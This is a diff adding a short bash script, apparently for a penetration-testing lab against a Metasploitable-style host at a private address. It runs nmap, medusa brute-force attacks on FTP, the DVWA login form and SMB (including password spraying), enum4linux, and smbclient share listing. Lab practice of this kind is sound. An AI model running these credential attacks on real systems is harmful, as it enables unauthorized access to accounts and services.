@@ -1,0 +1,30 @@
+#Scan inicial
+nmap -sV $IP
+
+
+IP=192.168.56.101
+
+echo "[+] Criando wordlists"
+echo -e "user\nmsfadmin\nadmin\nroot" > wordlists/users.txt
+echo -e "user\nmsfadmin\nadmin\nroot" > wordlists/pass.txt
+
+echo "[+] Ataque FTP"
+medusa -h $IP -U wordlists/users.txt -P wordlists/pass.txt -M ftp -t 6
+
+echo "[+] Testando acesso FTP"
+ftp $IP
+
+echo "[+] Ataque DVWA (HTTP Form)"
+medusa -h $IP -U wordlists/users.txt -P wordlists/pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+
+echo "[+] Enumeração SMB"
+enum4linux -a $IP | tee results/enum4_output.txt
+
+echo "[+] Password Spraying SMB"
+medusa -h $IP -U wordlists/smb_users.txt -P wordlists/senhas_spray.txt -M smbnt -t 2 -T 50
+
+echo "[+] Listando compartilhamentos SMB"
+smbclient -L //$IP -U msfadmin
